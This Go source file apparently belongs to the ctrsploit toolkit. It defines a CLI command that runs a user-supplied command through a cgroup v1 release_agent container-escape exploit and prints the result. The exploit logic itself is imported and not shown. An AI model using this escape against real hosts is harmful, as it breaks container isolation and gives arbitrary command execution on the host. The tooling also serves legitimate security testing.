package exploit

import (
	"fmt"
	cgroupV1releaseAgent "github.com/ctrsploit/ctrsploit/exploit/cgroupv1-release_agent"
	"github.com/ctrsploit/sploit-spec/pkg/log"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"github.com/urfave/cli/v2"
	"io"
)

var cgroupV1ReleaseAgentCommand = &cli.Command{
	Name:    cgroupV1releaseAgent.ExpName,
	Aliases: []string{"ra"},
	Usage:   "escape tech by using the notify_on_release of cgroup v1",
	Flags: []cli.Flag{
		&cli.StringFlag{Name: "cmd", Aliases: []string{"c"}, Required: true},
	},
	Action: func(context *cli.Context) error {
		cmd := context.String("cmd")
		log.Logger.Info(fmt.Sprintf("Execute command: %s", cmd))
		debug := context.Bool("debug")
		out, err := cgroupV1releaseAgent.InvokeExploit(cmd, debug)
		awesome_error.CheckFatal(err)
		output, err := io.ReadAll(out)
		awesome_error.CheckErr(err)
		fmt.Print(string(output))
		return nil
	},
}
